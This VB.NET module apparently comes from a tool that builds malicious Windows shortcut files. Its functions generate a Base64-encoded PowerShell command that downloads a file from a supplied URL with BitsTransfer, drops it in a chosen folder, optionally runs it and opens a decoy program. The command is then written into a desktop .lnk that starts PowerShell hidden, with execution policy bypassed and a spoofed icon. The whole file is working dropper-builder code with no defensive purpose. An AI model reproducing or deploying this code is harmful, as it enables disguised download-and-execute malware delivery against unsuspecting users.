Imports IWshRuntimeLibrary
Imports System.Management.Automation

Public Module Functions

    Public Function ExtStr(cadena As String, Opt As Long, Optional dirChar As String = "\") As String
        Dim FullName As String
        FullName = Mid$(cadena, InStrRev(cadena, dirChar) + 1)
        Select Case Opt
            Case 1
                ExtStr = Mid$(FullName, 1, InStrRev(FullName, ".") - 1)
            Case 2
                ExtStr = "." & Mid$(FullName, InStrRev(FullName, ".") + 1)
            Case 3
                ExtStr = FullName
            Case Else
                ExtStr = cadena
        End Select
    End Function

    Private Function GetPSCommand(URL As String, dropPath As String, fileName As String, processToShow As String, start As Boolean) As String
        Dim proc As String = If(processToShow.Equals(""), "", "; start """ & processToShow & """")
        Dim filePath As String = Replace(dropPath, "%", "")
        filePath = "$env:" & filePath & "\" & fileName
        Dim execute As String = If(start, "; start """ & filePath & """", "")
        Dim powershell As PowerShell = PowerShell.Create()
        Dim command As New PSCommand()
        command.AddScript("$commands = 'Import-Module BitsTransfer" & proc & "; Start-BitsTransfer " & URL & " """ & filePath & """" & execute & "'")
        command.AddScript("$bytes = [System.Text.Encoding]::Unicode.GetBytes($commands)")
        command.AddScript("$encodedString = [Convert]::ToBase64String($bytes)")
        command.AddScript("Echo $encodedString")
        powershell.Commands = command
        Dim results = powershell.Invoke
        Return Replace(results.Item(0).ToString(), vbCrLf, "")
    End Function

    Public Function CreateShortCut(args As WorkerArgs) As Boolean
        Dim ShortcutName As String = args.linkName
        Dim IconPath As String = args.icon
        Dim IconNumber As Long = args.numIcon
        Dim URL As String = args.url
        Dim dropPath As String = args.dropPath
        Dim fileName As String = args.dropName
        Dim processToShow As String = args.process
        Dim start As Boolean = args.execute
        Dim EncodedCommand = GetPSCommand(URL, dropPath, fileName, processToShow, start)
        Dim WshShell As New WshShell
        Dim FileName_ As String = My.Computer.FileSystem.SpecialDirectories.Desktop & "\" & ShortcutName & ".lnk"
        Dim shortCut As IWshRuntimeLibrary.IWshShortcut = DirectCast(WshShell.CreateShortcut(FileName_), IWshRuntimeLibrary.IWshShortcut)
        With shortCut
            .TargetPath = "powershell"
            .Arguments = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & EncodedCommand
            .IconLocation = IconPath & ", " & IconNumber
            .WindowStyle = "7"
            .Save()
        End With
        Return True
    End Function

    Public Function LoadIconFromFile(ByVal fileName As String, iconSize As Size) As Icon
        Select Case StrConv(ExtStr(fileName, 2), VbStrConv.Lowercase)
            Case ".exe", ".dll"
                Return System.Drawing.Icon.ExtractAssociatedIcon(fileName)
            Case ".ico"
                Return New Icon(fileName, iconSize)
        End Select
        Return New Icon("")
    End Function

End Module

Public Class WorkerArgs
    Public Property url As String
    Public Property linkName As String
    Public Property dropPath As String
    Public Property dropName As String
    Public Property execute As Boolean
    Public Property process As String
    Public Property icon As String
    Public Property numIcon As Long
End Class